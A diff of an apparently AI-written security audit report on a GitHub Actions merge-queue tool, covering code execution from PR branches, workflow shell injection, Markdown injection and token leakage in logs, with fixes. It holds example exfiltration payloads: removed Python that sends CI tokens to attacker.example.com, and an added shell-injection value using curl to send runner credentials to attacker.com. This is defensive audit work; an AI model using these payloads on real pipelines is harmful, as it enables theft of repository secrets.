@@ -1,266 +1,35 @@
 # Security Audit Report — merge-queue
 
-**Date:** 2026-04-03
-**Auditor:** Claude (claude-sonnet-4-6)
+**Date:** 2026-04-05
+**Auditor:** Claude (claude-opus-4-6)
 **Scope:** `merge_queue/`, `.github/workflows/`, `pyproject.toml`
-**Branch audited:** `main` (commit post-pull, 2026-04-03)
-
----
-
-## Resolution Status
-
-| Finding | Severity | Status | PR |
-|---------|----------|--------|----|
-| CRITICAL-1 | Critical | ✅ Resolved | #60 |
-| CRITICAL-2 | Critical | ✅ Resolved | #60 |
-| HIGH-1 | High | ✅ Resolved | #96 |
-| HIGH-2 | High | ✅ Resolved | #101 |
-| HIGH-3 | High | ✅ Resolved | #96 |
-| MEDIUM-1 | Medium | ✅ Resolved | #60 |
-| MEDIUM-2 | Medium | ❌ Open | — |
-| LOW-1 | Low | ❌ Open | — |
-| LOW-2 | Low | ❌ Open | — |
+**Branch audited:** `main` (2026-04-05)
 
 ---
 
 ## Executive Summary
 
-The merge queue has **two critical vulnerabilities** and **three high-severity issues**. The most serious is that the workflow installs Python code directly from a PR branch and then runs it with `GITHUB_TOKEN` and `MQ_ADMIN_TOKEN` in scope — this gives any contributor who can submit a PR unconditional code execution with those secrets. A secondary critical issue is workflow command injection via unsanitized PR data written into a `$GITHUB_OUTPUT` shell context.
+A fresh security sweep of the merge queue codebase. All previously-reported Critical and High findings have been resolved and are omitted. Three open findings remain from the prior audit (re-verified), plus two new findings discovered in this sweep.
 
 ---
 
 ## Findings
 
-### CRITICAL-1: Arbitrary code execution from PR branch with live secrets — ✅ RESOLVED
+### MEDIUM-1: Exception logging may echo token fragments
 
-**Status:** Resolved in PR #60. The bootstrap workaround was removed; the workflow now always checks out and installs from the default branch (`main`). New MQ code changes require merging to `main` before they take effect.
-
-**File:** `.github/workflows/merge-queue.yml`, lines 40–54
+**File:** `merge_queue/cli.py`, lines 79, 124, 207, 700, 941, 1045, 1476; `merge_queue/batch.py`, lines 108, 162; `merge_queue/config.py`, line 377
 
 **Description:**
 
-When the workflow is triggered by a `pull_request` event (label added/removed), the "Install merge queue" step checks out the PR's head SHA and runs `pip install ".[dev]"` from it:
-
-```yaml
-git checkout "$HEAD_SHA" 2>/dev/null
-pip install ".[dev]"
-```
-
-Immediately after installation, the workflow runs:
-
-```yaml
-- name: Run merge queue
-  run: python -m merge_queue ${{ steps.cmd.outputs.cmd }}
-  env:
-    GITHUB_TOKEN: ${{ github.token }}
-    MQ_ADMIN_TOKEN: ${{ secrets.MQ_ADMIN_TOKEN }}
-```
-
-Any code installed from the PR branch runs in the same process as that `python -m merge_queue` call. An attacker can modify any file under `merge_queue/` — for instance `merge_queue/__init__.py` or `merge_queue/cli.py` — to exfiltrate `os.environ["GITHUB_TOKEN"]` and `os.environ["MQ_ADMIN_TOKEN"]` at import time.
-
-There is no sandboxing between the installed package and the secret-bearing environment.
-
-**Attack scenario:**
-
-1. Attacker opens a PR that modifies `merge_queue/__init__.py` to add:
-   ```python
-   import os, urllib.request
-   urllib.request.urlopen(
-       "https://attacker.example.com/?" +
-       os.environ.get("GITHUB_TOKEN","") +
-       "&a=" + os.environ.get("MQ_ADMIN_TOKEN","")
-   )
-   ```
-2. Attacker (or a repo maintainer, or a bot) adds the `queue` or `re-test` label.
-3. The workflow installs from the PR head, then runs `python -m merge_queue enqueue <n>`.
-4. The `__init__.py` runs at import time, exfiltrating both tokens before the MQ logic is reached.
-
-**Impact:** Full exfiltration of `GITHUB_TOKEN` (write access to repo: push, merge, create releases, etc.) and `MQ_ADMIN_TOKEN` (ruleset administration: bypass branch protection on any branch).
-
-**Fix options:**
-
-- **Preferred:** Remove the bootstrap workaround entirely. Install from `main` always (this is the default). Accept that new MQ changes require a follow-up commit to `main` before they take effect on their own enqueue.
-- **If the bootstrap is necessary:** Install from the PR branch in a separate job that has NO secrets. Pass the result as an artifact. Run the secret-bearing job in a distinct, isolated step using only the artifact. This requires a two-job architecture.
-- **Minimum viable fix:** Do not pass `MQ_ADMIN_TOKEN` and `GITHUB_TOKEN` as environment variables to the `Run merge queue` step when the trigger is a `pull_request` event from a PR that modifies `merge_queue/` code. Detect this with a path filter and fail fast instead.
-
----
-
-### CRITICAL-2: Workflow command injection via `steps.cmd.outputs.cmd` — ✅ RESOLVED
-
-**Status:** Resolved in PR #60. The command is now passed via the `$MQ_CMD` environment variable instead of direct shell interpolation: `run: python -m merge_queue $MQ_CMD` with `env: MQ_CMD: ${{ steps.cmd.outputs.cmd }}`. This prevents shell interpretation of the command string.
-
-**File:** `.github/workflows/merge-queue.yml`, line 75
-
-```yaml
-- name: Run merge queue
-  run: python -m merge_queue ${{ steps.cmd.outputs.cmd }}
-```
-
-The value of `steps.cmd.outputs.cmd` is assembled in the "Determine command" step (lines 62–72) by interpolating PR data directly into a shell `echo` statement:
-
-```yaml
-echo "cmd=retest ${{ github.event.pull_request.number }}" >> "$GITHUB_OUTPUT"
-echo "cmd=enqueue ${{ github.event.pull_request.number }}" >> "$GITHUB_OUTPUT"
-echo "cmd=abort ${{ github.event.pull_request.number }}" >> "$GITHUB_OUTPUT"
-```
-
-`github.event.pull_request.number` is an integer provided by GitHub and is not directly injectable. However, the `workflow_dispatch` path writes the raw user-supplied `inputs.command` choice into `$GITHUB_OUTPUT`:
-
-```yaml
-echo "cmd=${{ inputs.command }}" >> "$GITHUB_OUTPUT"
-```
-
-For `workflow_dispatch`, `inputs.command` is constrained to a `choice` type (`process`, `check-rules`, `status`), so this specific path is low risk. The deeper problem is structural: `${{ steps.cmd.outputs.cmd }}` is interpolated directly into the `run:` shell script without quoting:
-
-```yaml
-run: python -m merge_queue ${{ steps.cmd.outputs.cmd }}
-```
-
-If `steps.cmd.outputs.cmd` ever contains shell metacharacters (e.g., because a future change adds a PR title or branch name to the output), this becomes a shell injection vector. PR titles and branch names are attacker-controlled strings and must never appear in an unquoted shell context.
-
-Additionally, the label-based trigger reads `${{ github.event.label.name }}` in an `if:` expression. While GitHub expressions in `if:` are not shell-executed, any future copy-paste of this pattern into a `run:` step would be critical.
-
-**Fix:**
-
-Quote the interpolation and use environment variables instead:
-
-```yaml
-- name: Run merge queue
-  run: python -m merge_queue $MQ_CMD
-  env:
-    MQ_CMD: ${{ steps.cmd.outputs.cmd }}
-    GITHUB_TOKEN: ${{ github.token }}
-    MQ_ADMIN_TOKEN: ${{ secrets.MQ_ADMIN_TOKEN }}
-```
-
-This prevents any shell interpretation of the command string. The argument is still passed as a single positional word, which is sufficient since the value is already validated to be one of a small set of known subcommands.
-
----
-
-### HIGH-1: PR data rendered into GitHub comment Markdown without sanitization — ✅ RESOLVED
-
-**Status:** Resolved in PR #96. A `_sanitize()` function strips backticks, brackets, and newlines from all user-controlled strings (PR titles, branch names, target branches) before embedding in Markdown. Applied consistently across all comment-generation paths.
-
-**File:** `merge_queue/comments.py`, lines 16–27 (`_stack_list`)
-
-```python
-def _stack_list(stack: list[dict]) -> str:
-    lines = []
-    for pr in stack:
-        num = pr.get("number", "?")
-        title = pr.get("title", "")
-        head = pr.get("head_ref", "")
-        line = f"- #{num} `{head}`"
-        if title:
-            line += f" — {title}"
-        lines.append(line)
-    return "\n".join(lines)
-```
-
-`head_ref` (branch name) and `title` (PR title) are attacker-controlled strings that are embedded directly into Markdown comment bodies. GitHub renders these comments in the PR UI.
-
-**Attack scenarios:**
-
-- **Branch name injection:** A branch named `` `foo` bar`` or `` ` `` can break out of the inline code span and inject arbitrary Markdown. Example branch: `feature/foo\` ![x](https://attacker.com/pixel.png)` would close the backtick span and inject an image tag that phones home (an exfiltration channel for the comment viewer's session, useful for CSRF probing).
-- **PR title injection:** Titles allow free-form Unicode and special characters. A title like `**Merge Queue — Merged** to \`main\`. ... [Click here](javascript:...)` could confuse the Markdown renderer.
-
-GitHub's comment rendering does sanitize `javascript:` links in most contexts, but broken Markdown structure can produce unexpected rendering artifacts, broken UI, and in edge cases confusion attacks against repo maintainers reviewing queue status.
-
-**Fix:**
-
-Sanitize `head_ref` and `title` before embedding in Markdown. At minimum, escape backticks in `head_ref` and strip or escape Markdown special characters in `title`:
-
-```python
-def _sanitize_inline(s: str) -> str:
-    """Strip characters that break Markdown inline contexts."""
-    return s.replace("`", "").replace("[", "").replace("]", "").replace("\n", " ")
-```
-
-Apply this to `title` and escape backticks in the `head` variable before the f-string.
-
----
-
-### HIGH-2: State branch (`mq/state`) writable by any PR author — ✅ RESOLVED
-
-**Status:** Resolved in PR #101. A `_ensure_mq_branches_protected()` function in `config.py` auto-creates a `mq-branches-protect` ruleset covering `refs/heads/mq/*` on first run. Only the admin token can write to these branches. State writes use `write_with_retry` with atomic compare-and-swap semantics. Note: `mq/state` is excluded from the branch protection ruleset because protecting it blocks atomic writes; it relies on the admin token for push access instead.
-
-**File:** `merge_queue/store.py`; `merge_queue/config.py`; GitHub permissions model
-
-**Description:**
-
-The queue's authoritative state is stored in `state.json` on the `mq/state` branch. The workflow has `contents: write` permission. The `mq/state` branch appears to have no explicit branch protection configured by the MQ itself — it is only written to by the workflow bot account.
-
-However, if the repo's branch protection does not explicitly protect `mq/state`, any user with push access to the repo (not just PR authors) could directly push to `mq/state` and rewrite `state.json`. This would allow:
-
-- Injecting a fake `active_batch` with a chosen `ruleset_id` to confuse the abort logic.
-- Reordering the queue by rewriting the `queue` array.
-- Inserting a fake history entry to cause the "recently merged" guard to skip re-enqueue.
-- Clearing the state to silently dequeue all pending PRs.
-
-Note: this requires push access to the repo, not just PR submission. Depending on repo settings (e.g., allowing fork PRs to push to target branches), the attack surface may be wider.
-
-**Fix:**
-
-Apply a branch ruleset to `mq/state` that allows only the `github-actions[bot]` actor to push. The MQ already has the infrastructure to create rulesets (via `MQ_ADMIN_TOKEN`) — add a setup step that ensures `mq/state` is protected on first run.
-
----
-
-### HIGH-3: `MQ_ADMIN_TOKEN` passed to PR-installed code with no privilege separation — ✅ RESOLVED
-
-**Status:** Resolved in PR #96. The `GitHubClient` now lazily initializes `_admin_session` only when an admin operation is actually invoked. The admin token is loaded from `MQ_ADMIN_TOKEN` env var at construction time but the admin session is only used for operations that require it (create/delete rulesets, `update_ref` to bypass branch protection). Combined with the CRITICAL-1 fix (code is always installed from `main`, not PR branches), the ambient token exposure risk is eliminated.
-
-**Residual consideration:** `update_ref` (which fast-forwards `main` after a successful batch) now uses the admin session to bypass branch protection rulesets. This is necessary because the MQ's own rulesets would otherwise block the fast-forward. The admin token must have `contents: write` and `administration: write` scopes. This is properly scoped — the token is only used for MQ-managed operations (rulesets and the final merge), not for arbitrary API calls.
-
-**File:** `.github/workflows/merge-queue.yml`, lines 76–78
-
-```yaml
-env:
-  GITHUB_TOKEN: ${{ github.token }}
-  MQ_ADMIN_TOKEN: ${{ secrets.MQ_ADMIN_TOKEN }}
-```
-
-`MQ_ADMIN_TOKEN` is described in `github_client.py` as granting Administration permission, which is required for creating and deleting branch rulesets (i.e., bypass branch protection). This token is passed unconditionally to every invocation of `python -m merge_queue`, including the enqueue and abort commands that do not require admin privileges.
-
-The principle of least privilege dictates that tokens should be scoped to the operations that require them. If an attacker achieves code execution (as in CRITICAL-1), the `MQ_ADMIN_TOKEN` exfiltration is the higher-value target: it can remove all branch protection rules from the repo permanently.
-
-**Fix:**
-
-Only inject `MQ_ADMIN_TOKEN` when the subcommand actually requires it (`process` calls `create_ruleset`/`delete_ruleset`; `abort` calls `delete_ruleset`). The `enqueue`, `status`, and `check-rules` subcommands do not require it. Refactor the "Determine command" step to set a flag indicating whether admin privileges are needed, and conditionally include the token.
-
-Alternatively, pass `MQ_ADMIN_TOKEN` as a CLI argument rather than an environment variable, so it is scoped to a subprocess boundary. This is a deeper refactor but eliminates ambient token exposure.
-
----
-
-### MEDIUM-1: `pyproject.toml` install hooks not present but the attack surface exists — ✅ RESOLVED
-
-**Status:** Resolved by the CRITICAL-1 fix in PR #60. Since the workflow no longer installs from PR branches, this attack surface no longer exists.
-
-**File:** `pyproject.toml`
-
-The current `pyproject.toml` uses `setuptools` as the build backend with no `[tool.setuptools.cmdclass]` overrides, no `setup.py`, no `setup.cfg` build hooks, and no custom entry points that execute at install time. The package discovery is limited to `merge_queue*` via `find`.
-
-**Current state:** No active install-hook vulnerability.
-
-**Residual risk:** The bootstrap step (`pip install ".[dev]"` from the PR branch) would execute any `build-system` hooks defined in a modified `pyproject.toml`. If an attacker changes the build backend to one that executes arbitrary code during the wheel build (e.g., a custom `setuptools` hook or switching to `hatchling` with a custom build hook), they achieve the same code execution as CRITICAL-1 but at install time rather than import time — and potentially before the `pip install` output is even visible in the logs.
-
-**Fix:** This is subsumed by fixing CRITICAL-1. If the PR branch is never installed in a secrets-bearing context, this attack surface disappears.
-
----
-
-### MEDIUM-2: Logging of error strings that may echo token fragments
-
-**File:** `merge_queue/cli.py`, lines 399, 407, 487 (and others)
-
-Exception messages from the `requests` library (used in `github_client.py`) can include the full request URL and, depending on the exception type, the `Authorization` header value. Python's default exception formatting does not redact headers. If a `requests.HTTPError` or `requests.ConnectionError` is raised, the exception string logged via `log.error(...)` or `log.warning(...)` may contain fragments of the bearer token.
-
-**Example risky pattern:**
-```python
-log.error("Failed to create batch: %s", e)
-```
+Exception messages from the `requests` library can include the full request URL and, depending on the exception type, the `Authorization` header value. Python's default exception formatting does not redact headers. When a `requests.HTTPError` or `requests.ConnectionError` is raised, the exception string logged via `log.error(...)` or `log.warning(...)` may contain fragments of the bearer token.
 
 GitHub Actions logs are retained and viewable by anyone with repo read access (public repos) or org members (private repos). An incomplete token fragment leaking into logs reduces the brute-force space for token recovery.
 
-**Fix:**
+Additionally, `github_client.py` line 610 logs `r.text[:500]` from API error responses, which could contain sensitive context in edge cases.
+
+**Risk:** Low-to-medium. Requires a network error or API error to trigger, and GitHub Actions masks known secret values in logs. But partial token exposure through exception chains bypasses masking.
+
+**Recommended fix:**
 
 Catch `requests.HTTPError` separately and log only `e.response.status_code` and `e.response.reason` without the full exception chain. Use a sanitizing wrapper:
 
@@ -268,29 +37,86 @@ Catch `requests.HTTPError` separately and log only `e.response.status_code` and 
 def _safe_error(e: Exception) -> str:
     if hasattr(e, "response") and e.response is not None:
         return f"HTTP {e.response.status_code} {e.response.reason}"
-    msg = str(e)
-    # Strip anything that looks like a bearer token
     import re
-    return re.sub(r'Bearer\s+\S+', 'Bearer [REDACTED]', msg)
+    return re.sub(r'Bearer\s+\S+', 'Bearer [REDACTED]', str(e))
+```
+
+---
+
+### MEDIUM-2: Unsanitized error strings rendered in PR comments
+
+**File:** `merge_queue/cli.py`, lines 960-963, 1477; `merge_queue/comments.py`, lines 255, 276-277
+
+**Description:**
+
+When batch creation fails, the raw exception message (`str(e)`) is passed to `comments.batch_error()` and rendered into a PR comment without sanitization. The `batch_error()` function does not call `_sanitize()` on the error string before embedding it in Markdown.
+
+The error string can contain git stderr output, which includes branch names (user-controlled) and merge conflict details. A crafted branch name could break Markdown structure in the error comment. Similarly, `cli.py:1477` renders `{e}` directly in a break-glass failure comment.
+
+The `comments.failed()` function at line 255 also renders `reason` without sanitization, though its callers currently pass controlled strings ("CI failed", divergence messages).
+
+**Risk:** Low. The attack requires a user to craft a branch name that triggers a specific error path, and GitHub's comment renderer provides some built-in sanitization. However, Markdown injection could produce confusing or misleading comments.
+
+**Recommended fix:**
+
+Apply `_sanitize()` to error strings before embedding in Markdown comments. In `batch_error()` and `failed()`, sanitize the `error`/`reason` parameter. In `cli.py:1477`, sanitize the exception message.
+
+---
+
+### MEDIUM-3: CI workflow `delay` input interpolated in shell context
+
+**File:** `.github/workflows/ci.yml`, line 78
+
+```yaml
+DELAY="${{ inputs.delay || '0' }}"
+```
+
+**Description:**
+
+The `delay` input is defined as `type: string` with no validation. It is directly interpolated into a `run:` shell context. A user with write access (required for `workflow_dispatch`) could supply a value like `0"; curl https://attacker.com/exfil?t=$(cat /home/runner/.credentials) #` to execute arbitrary shell commands.
+
+**Risk:** Low. Exploiting this requires `actions: write` permission on the repo, which already grants the ability to create workflows with arbitrary code. This is a defense-in-depth concern, not a privilege escalation.
+
+**Recommended fix:**
+
+Pass the input as an environment variable instead of interpolating it:
+
+```yaml
+- name: CI delay
+  run: |
+    if [ "$DELAY" -gt 0 ] 2>/dev/null; then
+      echo "Sleeping ${DELAY}s for integration test..."
+      sleep "$DELAY"
+    fi
+  env:
+    DELAY: ${{ inputs.delay || '0' }}
 ```
 
 ---
 
 ### LOW-1: `dispatch_ci_on_ref` accepts arbitrary branch refs from PR data
 
-**File:** `merge_queue/cli.py`, line 621; `merge_queue/github_client.py`, line 547
+**File:** `merge_queue/cli.py`, line 1207; `merge_queue/github_client.py`, line 689
 
-The `do_retest` function dispatches a CI workflow run on `pr_data["head"]["ref"]` — a branch name fetched from the GitHub API for an open PR. While this is not directly attacker-controlled (it goes through the API), it is worth noting that the `workflow_dispatch` event is being triggered with a user-controlled branch name as both the `ref` and the `inputs.ref`. The `ci.yml` workflow uses `inputs.ref` as a `git checkout` ref without quoting issues in the YAML (it uses `${{ inputs.ref || github.sha }}`), which is safe as a GitHub expression. No direct injection risk identified, but the pattern should be reviewed if the CI workflow is extended.
+**Description:**
+
+The `do_retest` function dispatches a CI workflow run on `pr_data["head"]["ref"]` -- a branch name fetched from the GitHub API for an open PR. While this is not directly attacker-controlled (it goes through the API), the `workflow_dispatch` event is triggered with a user-controlled branch name as both the `ref` and `inputs.ref`. The `ci.yml` workflow uses `inputs.ref` as a `git checkout` ref without quoting issues in the YAML (it uses `${{ inputs.ref || github.sha }}`), which is safe as a GitHub expression. No direct injection risk identified, but the pattern should be reviewed if the CI workflow is extended.
+
+**Risk:** Very low. No current injection vector; noted for future-proofing.
 
 ---
 
 ### LOW-2: Concurrency group does not cover CI workflow
 
-**File:** `.github/workflows/merge-queue.yml`, lines 13–15
+**File:** `.github/workflows/merge-queue.yml`, lines 13-15
+
+**Description:**
 
 The `concurrency: group: merge-queue` setting prevents two MQ workflow runs from overlapping. However, it does not prevent a race between an MQ run dispatching CI and a separate PR label event triggering a second MQ run after the `store.write(state)` call sets `active_batch` but before CI completes.
 
-The code has a 30-minute stale-batch recovery timer and state-based guards, which mitigate this, but the window between `store.write` and CI completion is long enough for a race if GitHub's concurrency enforcement has any gap (e.g., a rapid label add/remove/add sequence). This is an operational reliability issue more than a security issue, but could be used to DoS the queue.
+The code has a 30-minute stale-batch recovery timer and state-based guards, which mitigate this. The window between `store.write` and CI completion is long enough for a race if GitHub's concurrency enforcement has any gap (e.g., a rapid label add/remove/add sequence). This is primarily an operational reliability issue, but could be used to DoS the queue.
+
+**Risk:** Low. Mitigated by stale-batch recovery and state guards.
 
 ---
 
@@ -298,13 +124,9 @@ The code has a 30-minute stale-batch recovery timer and state-based guards, whic
 
 | ID | Severity | Title |
 |---|---|---|
-| CRITICAL-1 | Critical | Arbitrary code execution from PR branch with live secrets |
-| CRITICAL-2 | Critical | Workflow shell injection via unquoted `steps.cmd.outputs.cmd` |
-| HIGH-1 | High | PR data (branch name, title) embedded in Markdown without sanitization |
-| HIGH-2 | High | `mq/state` branch unprotected, writable by any repo push-access holder |
-| HIGH-3 | High | `MQ_ADMIN_TOKEN` passed to all subcommands, no privilege separation |
-| MEDIUM-1 | Medium | `pyproject.toml` install hook attack surface (latent, blocked by CRITICAL-1 fix) |
-| MEDIUM-2 | Medium | Exception logging may echo token fragments |
+| MEDIUM-1 | Medium | Exception logging may echo token fragments |
+| MEDIUM-2 | Medium | Unsanitized error strings rendered in PR comments |
+| MEDIUM-3 | Medium | CI workflow `delay` input interpolated in shell context |
 | LOW-1 | Low | `dispatch_ci_on_ref` uses PR-supplied branch ref |
 | LOW-2 | Low | Concurrency gap allows queue DoS via rapid label events |
 
@@ -312,18 +134,22 @@ The code has a 30-minute stale-batch recovery timer and state-based guards, whic
 
 ## Recommended Fix Priority
 
-All Critical and High findings have been resolved. Remaining open items:
+1. **MEDIUM-1** -- Exception logging may echo token fragments. Add a `_safe_error` wrapper to strip bearer tokens from logged exceptions.
+2. **MEDIUM-2** -- Unsanitized error strings in PR comments. Apply `_sanitize()` to all user-facing error messages before Markdown rendering.
+3. **MEDIUM-3** -- CI workflow `delay` input shell injection. Use environment variable instead of direct interpolation.
+4. **LOW-1** -- `dispatch_ci_on_ref` branch ref pattern. No action needed now; review if CI workflow changes.
+5. **LOW-2** -- Concurrency gap. No action needed; mitigated by existing guards.
 
-1. **MEDIUM-2** — Exception logging may echo token fragments. Low urgency since CRITICAL-1 eliminated the primary code-execution vector.
-2. **LOW-1** — `dispatch_ci_on_ref` uses PR-supplied branch ref. No direct injection risk identified.
-3. **LOW-2** — Concurrency gap allows queue DoS via rapid label events. Mitigated by stale-batch recovery timer.
+## Security Posture Notes
 
-## New Security Considerations (2026-04-05)
-
-- **`update_ref` uses admin token**: The `update_ref` method in `github_client.py` uses `_admin_session` to fast-forward `main` after a successful batch. This is required to bypass the MQ's own branch protection rulesets. The admin token must have `contents: write` and `administration: write` scopes. This is properly scoped — the operation is only reachable through the `process` command's completion path, and the code is always installed from `main` (not PR branches). No action needed, but worth noting for future audits.
-
-- **`break-glass` auth**: The `break-glass` label is gated behind `_is_break_glass_authorized()`, which checks both GitHub admin status and the `break_glass_users` config list. This prevents unauthorized users from skipping CI.
+- **Code installation**: The workflow installs from the default branch only (`main`), not from PR branches. This eliminates the critical code-execution vector found in the original audit.
+- **Command passing**: The MQ command is passed via `$MQ_CMD` environment variable, not shell interpolation. Safe against injection.
+- **Admin token separation**: `MQ_ADMIN_TOKEN` is lazily used only for admin operations (rulesets, `update_ref`). The admin session is only constructed at init but only exercised by `create_ruleset`, `delete_ruleset`, `get_ruleset`, `list_rulesets`, and `update_ref`.
+- **State branch protection**: `mq/*` branches are protected by an auto-created `mq-branches-protect` ruleset. `mq/state` relies on admin-token-only push access and workflow concurrency for integrity.
+- **Break-glass/hotfix auth**: Both `break-glass` and `hotfix` are gated by `_is_break_glass_authorized()`, checking GitHub admin/maintain permission and the `break_glass_users` config list.
+- **Markdown sanitization**: PR titles, branch names, and target branches are sanitized via `_sanitize()` before embedding in comment Markdown. Error strings are the remaining gap (MEDIUM-2).
+- **Subprocess calls**: All `subprocess.run()` calls in `batch.py` use list-form arguments (no `shell=True`), preventing shell injection through branch names.
 
 ---
 
-*This report was produced by automated analysis of the codebase at the commit shown above. Updated 2026-04-05 to reflect resolved findings. It does not substitute for a full penetration test or a red-team exercise against a live deployment.*
+*This report was produced by automated analysis of the codebase. It does not substitute for a full penetration test or a red-team exercise against a live deployment.*
